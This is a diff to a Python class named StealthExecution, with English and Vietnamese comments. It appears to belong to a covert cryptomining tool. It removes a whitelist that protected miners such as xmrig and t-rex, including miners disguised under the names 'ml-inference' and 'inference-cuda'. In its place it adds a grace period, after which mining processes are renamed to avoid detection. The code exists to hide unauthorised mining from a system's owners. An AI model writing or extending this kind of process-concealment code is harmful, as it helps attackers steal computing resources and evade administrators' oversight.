@@ -101,15 +101,9 @@ class StealthExecution:
         from threading import RLock
         self._whitelist_lock = RLock()
         
-        # **Mining Process Whitelist** (Danh sách trắng tiến trình mining)
-        self.MINING_PROCESS_WHITELIST: Set[str] = {
-            "ml-inference",      # CPU mining process from logs
-            "inference-cuda",    # GPU mining process from logs  
-            "xmrig",            # Alternative CPU miner
-            "t-rex",            # Alternative GPU miner
-            "start_mining.py",  # Main mining script
-            "python"            # Python interpreter cho mining scripts
-        }
+        # 🕒 **Grace Period** (Khoảng thời gian ân hạn trước khi đổi tên)
+        # Cho phép tiến trình mining ổn định trước khi STEALTH_RENAME.
+        self._grace_period_secs: int = int(os.getenv("STEALTH_GRACE_PERIOD", "30"))  # mặc định 30 giây
         
         # **Protected Process Registry** (Registry tiến trình được bảo vệ)
         self._protected_processes: Dict[int, Dict[str, Any]] = {}
@@ -313,12 +307,14 @@ class StealthExecution:
                 self._emergency_cleanup()
             
             # **Whitelist Check** (Kiểm tra danh sách trắng)
-            if process_name in self.MINING_PROCESS_WHITELIST:
+            # **Grace Period Check** (Kiểm tra thời gian ân hạn)
+            try:
+                proc_ctime = os.path.getctime(f"/proc/{pid}")
+            except Exception:
+                proc_ctime = time.time()
+            if time.time() - proc_ctime < self._grace_period_secs:
+                # Chờ hết ân hạn trước khi disguise
                 self._register_protected_process(pid, process_name)
-                self.logger.info(
-                    f"🛡️ [PROTECTION] PID {pid} ({process_name}) - "
-                    f"Mining process protected from STEALTH disguising"
-                )
                 return False
             
             # **Binary Path Security Verification** (Xác minh đường dẫn binary bảo mật)
@@ -391,18 +387,7 @@ class StealthExecution:
             try:
                 exe_path = os.readlink(f"/proc/{pid}/exe")
                 
-                # **Whitelist Binary Validation** (Xác thực binary whitelist)
-                if process_name in self.MINING_PROCESS_WHITELIST:
-                    expected_paths = [
-                        "/usr/local/bin/ml-inference",
-                        "/usr/local/bin/inference-cuda",
-                        "/usr/bin/python",
-                        "/usr/bin/python3"
-                    ]
-                    path_match = any(expected in exe_path for expected in expected_paths)
-                    if not path_match:
-                        self.logger.warning(f"⚠️ [SECURITY] Whitelist process {process_name} has unexpected binary path: {exe_path}")
-                        return False
+
                         
             except (OSError, IOError):
                 # Có thể không đọc được exe link, vẫn cho phép continue
